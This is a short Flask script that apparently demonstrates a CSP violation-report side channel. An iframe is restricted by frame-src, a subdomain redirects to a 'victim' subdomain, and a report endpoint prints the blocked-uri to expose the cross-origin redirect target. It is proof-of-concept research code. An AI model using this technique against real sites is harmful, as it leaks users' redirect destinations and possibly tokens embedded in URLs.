from flask import Flask, send_from_directory, request, render_template, render_template_string, jsonify, make_response, redirect
app = Flask(__name__)


def get_host(request):
	from urllib.parse import urlparse
	o = urlparse(request.base_url)
	return o.hostname


@app.route('/index')
@app.route('/')
def index():
	hostname = get_host(request)
	if hostname == "trieulieuf9.com":
		html = """
			<iframe src="http://redirect.trieulieuf9.com:8000">
		"""
		resp = make_response(html)
		# resp.headers['Content-Security-Policy'] = 'frame-src http://redirect.trieulieuf9.com:8000; report-uri /report'
		resp.headers['Report-To'] = '{"group":"endpoint-1","max_age": 10886400,"endpoints": [{ "url": "http://trieulieuf9.com:8000/report"}]}'
		resp.headers['Content-Security-Policy'] = f'frame-src http://redirect.trieulieuf9.com:8000; report-to endpoint-1'
		return resp
	elif hostname == "redirect.trieulieuf9.com":
		return redirect("http://victim.trieulieuf9.com:8000", code=302)
	elif hostname == "victim.trieulieuf9.com":
		return "victim"
	else:
		return "you should not see this"


@app.route('/report', methods=["POST"])
def report():
	# look at the blocked-uri value!!
	print(request.data, flush=True)
	return "hello"



if __name__ == '__main__':
	app.run(host='127.0.0.1', port=8000, debug=True)
